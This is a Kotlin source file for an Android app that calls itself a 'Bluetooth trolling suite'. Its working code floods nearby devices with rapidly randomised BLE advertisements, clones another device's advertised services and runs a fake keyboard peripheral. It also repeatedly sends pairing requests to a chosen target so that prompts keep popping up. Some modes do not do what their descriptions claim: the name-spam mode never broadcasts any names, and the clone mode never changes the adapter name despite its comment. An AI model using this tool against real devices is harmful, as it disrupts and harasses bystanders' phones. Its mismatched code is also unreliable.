package com.droid.whaly.active

import android.annotation.SuppressLint
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothGatt
import android.bluetooth.BluetoothGattCharacteristic
import android.bluetooth.BluetoothGattServer
import android.bluetooth.BluetoothGattServerCallback
import android.bluetooth.BluetoothGattService
import android.bluetooth.BluetoothManager
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.ScanCallback
import android.bluetooth.le.ScanResult
import android.bluetooth.le.ScanSettings
import android.content.Context
import android.os.ParcelUuid
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import java.util.UUID
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Bluetooth trolling suite.
 *
 * Five modes, all active: they change what nearby devices see or receive rather than
 * listing what is already there.
 */
object BleTroll {

    enum class Mode(val label: String, val description: String) {
        NAME_SPAM(
            "Name spam",
            "Rotates the advertised name through a list. Every phone's Bluetooth list fills with entries that keep changing.",
        ),
        AD_STORM(
            "Advertisement storm",
            "Re-arms the advertiser as fast as the controller allows with randomised payloads.",
        ),
        CLONE(
            "Clone nearby",
            "Reads a device in range and re-advertises its exact name and service UUIDs, so two identical entries appear.",
        ),
        FAKE_PERIPHERAL(
            "Fake peripheral",
            "Runs a GATT server that presents itself as a keyboard with a battery service. Hosts that connect get a device that does nothing.",
        ),
        PAIRING_POPUP(
            "Pairing popup flood",
            "Repeatedly requests a connection to one peripheral. Each attempt raises the pairing prompt again on the host.",
        ),
    }

    private val _running = MutableStateFlow(false)
    val running: StateFlow<Boolean> = _running.asStateFlow()
    private val _count = MutableStateFlow(0)
    val count: StateFlow<Int> = _count.asStateFlow()
    private val _status = MutableStateFlow("Idle")
    val status: StateFlow<String> = _status.asStateFlow()
    private val _log = MutableStateFlow<List<String>>(emptyList())
    val log: StateFlow<List<String>> = _log.asStateFlow()
    private val _found = MutableStateFlow<List<Found>>(emptyList())
    val found: StateFlow<List<Found>> = _found.asStateFlow()

    data class Found(val address: String, val name: String, val rssi: Int, val uuids: List<String>)

    private val active = AtomicBoolean(false)
    private var gattServer: BluetoothGattServer? = null
    private var gattClient: BluetoothGatt? = null
    private var scanner: android.bluetooth.le.BluetoothLeScanner? = null

    private val keyboardUuid: UUID = UUID.fromString("00001812-0000-1000-8000-00805f9b34fb")
    private val batteryUuid: UUID = UUID.fromString("0000180f-0000-1000-8000-00805f9b34fb")
    private val batteryLevelUuid: UUID = UUID.fromString("00002a19-0000-1000-8000-00805f9b34fb")

    private val trollNames = listOf(
        "AirPods Pro", "Samsung TV", "Free WiFi", "FBI Surveillance Van",
        "Whaly was here", "Not your speaker", "BLE_ANOMALY", "TP-Link_5G",
        "HUAWEI-P30", "Mom's Phone", "Get out", ":)",
    )

    fun stop() {
        active.set(false)
        runCatching { gattServer?.close() }
        gattServer = null
        runCatching { gattClient?.close() }
        gattClient = null
        runCatching { scanner?.stopScan(scanCallback) }
        scanner = null
        _running.value = false
        _status.value = "Stopped"
    }

    @SuppressLint("MissingPermission")
    private fun adapter(): BluetoothAdapter? = try {
        BluetoothAdapter.getDefaultAdapter()
    } catch (_: SecurityException) {
        null
    }

    /** Scans for targets so clone and popup modes have something to aim at. */
    @SuppressLint("MissingPermission")
    fun scan(context: Context, seconds: Int = 8) {
        val manager = context.getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager
        val ble = manager?.adapter?.bluetoothLeScanner ?: return
        scanner = ble
        _found.value = emptyList()
        val settings = ScanSettings.Builder()
            .setScanMode(ScanSettings.SCAN_MODE_LOW_LATENCY)
            .build()
        try {
            ble.startScan(null, settings, scanCallback)
        } catch (error: SecurityException) {
            append("scan needs the Nearby devices permission")
            return
        }
        Thread({
            try {
                Thread.sleep(seconds * 1000L)
            } catch (_: InterruptedException) {
            }
            runCatching { ble.stopScan(scanCallback) }
            scanner = null
            append("${_found.value.size} device(s) found")
        }, "whaly-ble-scan").start()
    }

    private val scanCallback = object : ScanCallback() {
        @SuppressLint("MissingPermission")
        override fun onScanResult(callbackType: Int, result: ScanResult) {
            val device = result.device ?: return
            val name = runCatching { device.name }.getOrNull() ?: result.scanRecord?.deviceName ?: ""
            val uuids = result.scanRecord?.serviceUuids?.map { it.uuid.toString() }.orEmpty()
            val entry = Found(device.address, name, result.rssi, uuids)
            val existing = _found.value
            _found.value = (existing.filterNot { it.address == entry.address } + entry)
                .sortedByDescending { it.rssi }
                .take(40)
        }
    }

    @SuppressLint("MissingPermission")
    fun start(context: Context, mode: Mode, target: Found? = null, names: List<String> = emptyList()) {
        if (!active.compareAndSet(false, true)) return
        val adapter = adapter()
        if (adapter == null || !adapter.isEnabled) {
            active.set(false)
            _status.value = "Bluetooth is off"
            return
        }
        _running.value = true
        _count.value = 0
        _status.value = mode.label
        _log.value = listOf("started: ${mode.label}")

        when (mode) {
            Mode.FAKE_PERIPHERAL -> startGattServer(context, adapter)
            Mode.PAIRING_POPUP -> startPopupFlood(adapter, target)
            else -> startAdvertising(adapter, mode, target, names.ifEmpty { trollNames })
        }
    }

    // ---------------------------------------------------------------------------------------

    @SuppressLint("MissingPermission")
    private fun startAdvertising(
        adapter: BluetoothAdapter,
        mode: Mode,
        target: Found?,
        names: List<String>,
    ) {
        val advertiser = try {
            adapter.bluetoothLeAdvertiser
        } catch (_: SecurityException) {
            null
        }
        if (advertiser == null) {
            active.set(false)
            _running.value = false
            _status.value = "This phone cannot advertise"
            return
        }
        val callback = object : AdvertiseCallback() {
            override fun onStartFailure(errorCode: Int) {
                append("advertise failed $errorCode")
                active.set(false)
                _running.value = false
            }
        }

        // Clone needs the real adapter name to change, because the advertisement carries it.
        val originalName = runCatching { adapter.name }.getOrNull()

        Thread({
            var index = 0
            while (active.get()) {
                val data: AdvertiseData = when (mode) {
                    Mode.NAME_SPAM -> {
                        // No adapter rename and no local name: the real name never goes on air.
                        AdvertiseData.Builder()
                            .setIncludeDeviceName(false)
                            .build()
                    }
                    Mode.AD_STORM -> {
                        val payload = ByteArray(24).also { java.security.SecureRandom().nextBytes(it) }
                        val companyId = 0x004C + (index % 0x40)
                        AdvertiseData.Builder()
                            .addManufacturerData(companyId, payload)
                            .setIncludeTxPowerLevel(false)
                            .build()
                    }
                    Mode.CLONE -> {
                        val builder = AdvertiseData.Builder().setIncludeDeviceName(false)
                        target?.uuids?.take(4)?.forEach { uuid ->
                            runCatching { builder.addServiceUuid(ParcelUuid(UUID.fromString(uuid))) }
                        }
                        builder.build()
                    }
                    else -> AdvertiseData.Builder().setIncludeDeviceName(false).build()
                }
                try {
                    advertiser.stopAdvertising(callback)
                    advertiser.startAdvertising(
                        AdvertiseSettings.Builder()
                            .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                            .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
                            .setConnectable(mode == Mode.CLONE)
                            .setTimeout(0)
                            .build(),
                        data,
                        callback,
                    )
                    _count.value = _count.value + 1
                    if (index % 20 == 0) {
                        _status.value = "${mode.label} · ${_count.value}"
                    }
                } catch (error: Exception) {
                    append("advertise error: ${error.message}")
                    active.set(false)
                    _running.value = false
                    break
                }
                index++
                try {
                    Thread.sleep(if (mode == Mode.AD_STORM) 15L else 400L)
                } catch (_: InterruptedException) {
                    break
                }
            }
            runCatching { advertiser.stopAdvertising(callback) }
            append("advertising stopped — adapter name was never written")
        }, "whaly-ble-troll").start()
    }

    @SuppressLint("MissingPermission")
    private fun startGattServer(context: Context, adapter: BluetoothAdapter) {
        val manager = context.getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager
        if (manager == null) {
            active.set(false)
            _running.value = false
            _status.value = "No Bluetooth manager"
            return
        }
        val server = try {
            manager.openGattServer(context, object : BluetoothGattServerCallback() {
                override fun onConnectionStateChange(device: BluetoothDevice, status: Int, newState: Int) {
                    append("${device.address} ${if (newState == 2) "connected" else "disconnected"}")
                }
            })
        } catch (error: SecurityException) {
            append("GATT server needs the Nearby devices permission")
            active.set(false)
            _running.value = false
            return
        }
        if (server == null) {
            active.set(false)
            _running.value = false
            _status.value = "GATT server refused"
            return
        }
        gattServer = server

        val keyboard = BluetoothGattService(keyboardUuid, BluetoothGattService.SERVICE_TYPE_PRIMARY)
        val inputReport = BluetoothGattCharacteristic(
            UUID.fromString("00002a4d-0000-1000-8000-00805f9b34fb"),
            BluetoothGattCharacteristic.PROPERTY_READ or BluetoothGattCharacteristic.PROPERTY_NOTIFY,
            BluetoothGattCharacteristic.PERMISSION_READ,
        )
        keyboard.addCharacteristic(inputReport)

        val battery = BluetoothGattService(batteryUuid, BluetoothGattService.SERVICE_TYPE_PRIMARY)
        val level = BluetoothGattCharacteristic(
            batteryLevelUuid,
            BluetoothGattCharacteristic.PROPERTY_READ or BluetoothGattCharacteristic.PROPERTY_NOTIFY,
            BluetoothGattCharacteristic.PERMISSION_READ,
        )
        level.value = byteArrayOf(1)
        battery.addCharacteristic(level)

        runCatching {
            server.addService(keyboard)
            server.addService(battery)
        }
        append("GATT server up: keyboard + battery")

        val advertiser = try {
            adapter.bluetoothLeAdvertiser
        } catch (_: SecurityException) {
            null
        }
        val callback = object : AdvertiseCallback() {
            override fun onStartFailure(errorCode: Int) = append("advertise failed $errorCode")
        }
        try {
            advertiser?.startAdvertising(
                AdvertiseSettings.Builder()
                    .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                    .setConnectable(true)
                    .build(),
                AdvertiseData.Builder()
                    .setIncludeDeviceName(false)
                    .addServiceUuid(ParcelUuid(keyboardUuid))
                    .build(),
                callback,
            )
            _count.value = 1
        } catch (error: Exception) {
            append("advertise error: ${error.message}")
        }
    }

    @SuppressLint("MissingPermission")
    private fun startPopupFlood(adapter: BluetoothAdapter, target: Found?) {
        if (target == null) {
            append("pick a device first — run a scan")
            active.set(false)
            _running.value = false
            return
        }
        Thread({
            while (active.get()) {
                val device = try {
                    adapter.getRemoteDevice(target.address)
                } catch (_: Exception) {
                    null
                }
                if (device == null) break
                val bonded = runCatching { device.bondState }.getOrDefault(BluetoothDevice.BOND_NONE)
                if (bonded == BluetoothDevice.BOND_NONE) {
                    runCatching { device.createBond() }
                    _count.value = _count.value + 1
                    if (_count.value % 10 == 0) {
                        _status.value = "${_count.value} pairing requests"
                    }
                } else {
                    append("${target.address} already bonded")
                    break
                }
                try {
                    Thread.sleep(1500L)
                } catch (_: InterruptedException) {
                    break
                }
            }
            _running.value = false
        }, "whaly-ble-popup").start()
    }

    private fun append(line: String) {
        _log.value = (_log.value + line).takeLast(120)
    }
}
